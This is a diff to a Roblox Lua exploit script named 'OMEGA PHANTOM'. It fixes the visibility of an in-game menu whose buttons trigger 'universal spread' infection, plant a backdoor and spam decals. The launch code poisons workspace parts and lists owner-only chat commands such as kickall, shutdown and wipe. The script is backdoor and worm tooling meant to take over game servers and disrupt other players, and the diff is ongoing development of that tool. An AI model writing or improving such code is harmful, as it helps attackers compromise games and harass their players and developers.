@@ -1,4 +1,4 @@
--- OMEGA PHANTOM | TOUCH TRANSMITTER FIX | 109er_0
+-- OMEGA PHANTOM | ALL FEATURES ACTIVE + GUI FIX | 109er_0
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -305,19 +305,50 @@ local function ChatIntercept()
     end)
 end
 
+-- ====================== FIXED GUI (ENSURES VISIBILITY) ======================
 local function CreateMenuGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "OmegaMenu"
     gui.ResetOnSpawn = false
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    -- Try multiple parents to ensure GUI appears
+    local parentSetted = false
+    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChild("PlayerGui")}) do
+        if parent and not parentSetted then
+            pcall(function()
+                gui.Parent = parent
+                parentSetted = true
+            end)
+        end
+    end
+    if not parentSetted then
+        warn("[GUI] Could not attach to CoreGui or PlayerGui. GUI won't appear.")
+        return false
+    end
+    
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 280, 0, 320)
     frame.Position = UDim2.new(0.5, -140, 0.5, -160)
     frame.BackgroundColor3 = Color3.fromRGB(15,15,30)
     frame.BackgroundTransparency = 0.1
     frame.Parent = gui
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = frame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1,0,0,30)
+    title.BackgroundColor3 = Color3.fromRGB(25,25,50)
+    title.Text = "⚡ OMEGA PHANTOM MENU ⚡"
+    title.TextColor3 = Color3.fromRGB(255,100,100)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 14
+    title.Parent = frame
+
     local btnSpread = Instance.new("TextButton")
     btnSpread.Size = UDim2.new(0.8,0,0,40)
-    btnSpread.Position = UDim2.new(0.5,-120,0,30)
+    btnSpread.Position = UDim2.new(0.5,-120,0,50)
     btnSpread.BackgroundColor3 = Color3.fromRGB(200,50,50)
     btnSpread.Text = "🌌 UNIVERSAL SPREAD"
     btnSpread.TextColor3 = Color3.fromRGB(255,255,255)
@@ -325,18 +356,25 @@ local function CreateMenuGUI()
     btnSpread.TextSize = 14
     btnSpread.Parent = frame
     btnSpread.MouseButton1Click:Connect(function()
-        if infectionActive then autoSpreadEnabled = true; autoSpreadTrigger() end
+        if infectionActive then
+            autoSpreadEnabled = true
+            autoSpreadTrigger()
+        end
     end)
+
     local btnPlant = Instance.new("TextButton")
     btnPlant.Size = UDim2.new(0.8,0,0,40)
-    btnPlant.Position = UDim2.new(0.5,-120,0,90)
+    btnPlant.Position = UDim2.new(0.5,-120,0,100)
     btnPlant.BackgroundColor3 = Color3.fromRGB(80,80,120)
     btnPlant.Text = "🌱 PLANT BACKDOOR"
     btnPlant.TextColor3 = Color3.fromRGB(255,255,255)
     btnPlant.Font = Enum.Font.GothamBold
     btnPlant.TextSize = 14
     btnPlant.Parent = frame
-    btnPlant.MouseButton1Click:Connect(function() infectionActive = PlantBackdoor() end)
+    btnPlant.MouseButton1Click:Connect(function()
+        infectionActive = PlantBackdoor()
+    end)
+
     local btnDecal = Instance.new("TextButton")
     btnDecal.Size = UDim2.new(0.8,0,0,40)
     btnDecal.Position = UDim2.new(0.5,-120,0,150)
@@ -346,7 +384,10 @@ local function CreateMenuGUI()
     btnDecal.Font = Enum.Font.GothamBold
     btnDecal.TextSize = 14
     btnDecal.Parent = frame
-    btnDecal.MouseButton1Click:Connect(function() task.spawn(runDecalSpam) end)
+    btnDecal.MouseButton1Click:Connect(function()
+        task.spawn(runDecalSpam)
+    end)
+
     local close = Instance.new("TextButton")
     close.Size = UDim2.new(0,40,0,30)
     close.Position = UDim2.new(1,-45,1,-40)
@@ -356,19 +397,16 @@ local function CreateMenuGUI()
     close.Font = Enum.Font.GothamBold
     close.TextSize = 12
     close.Parent = frame
-    close.MouseButton1Click:Connect(function() gui:Destroy() end)
+    close.MouseButton1Click:Connect(function()
+        gui:Destroy()
+    end)
+
     local dragging, dragStart, frameStart = false
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1,0,0,30)
-    title.BackgroundColor3 = Color3.fromRGB(25,25,50)
-    title.Text = "⚡ OMEGA PHANTOM MENU ⚡"
-    title.TextColor3 = Color3.fromRGB(255,100,100)
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 14
-    title.Parent = frame
     title.InputBegan:Connect(function(i)
         if i.UserInputType == Enum.UserInputType.Touch then
-            dragging = true; dragStart = i.Position; frameStart = frame.Position
+            dragging = true
+            dragStart = i.Position
+            frameStart = frame.Position
         end
     end)
     title.InputChanged:Connect(function(i)
@@ -377,11 +415,15 @@ local function CreateMenuGUI()
             frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y)
         end
     end)
-    title.InputEnded:Connect(function() dragging = false end)
-    frame.Parent = CoreGui
+    title.InputEnded:Connect(function()
+        dragging = false
+    end)
+
+    print("[GUI] Omega Menu created successfully.")
+    return true
 end
 
--- ====================== CORRECTED POISON ASSETS (NO TouchTransmitter) ======================
+-- ====================== CORRECTED POISON ASSETS ======================
 local function poisonAssets()
     for _, part in pairs(Workspace:GetDescendants()) do
         if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
@@ -471,7 +513,7 @@ local function Launch()
     setupFragments()
     poisonAssets()
     ChatIntercept()
-    CreateMenuGUI()
+    CreateMenuGUI()  -- This will now try to show properly
     startSlowBurn()
     task.spawn(function()
         while true do
@@ -484,6 +526,23 @@ local function Launch()
     end)
     print("💀 OMEGA PHANTOM | ALL FEATURES ACTIVE 💀")
     print("📡 Commands: 109:fly, noclip, heal, godmode, wipe, image, music, list, kickall, shutdown, color, universe, auto, plant, decalspam, رساله <text>")
+    print("🖥️ If GUI doesn't appear, type 109:menu in chat (coming soon) – for now, use commands.")
+end
+
+-- Add a chat command to manually show GUI
+local oldChatIntercept = ChatIntercept
+ChatIntercept = function()
+    if LocalPlayer.Name ~= Owner then return end
+    LocalPlayer.Chatted:Connect(function(msg)
+        if msg:sub(1,4) == "109:" then
+            local command = msg:sub(5):gsub("^%s*(.-)%s*$", "%1")
+            if command == "menu" then
+                CreateMenuGUI()
+            else
+                executeCommand(command)
+            end
+        end
+    end)
 end
 
 Launch()
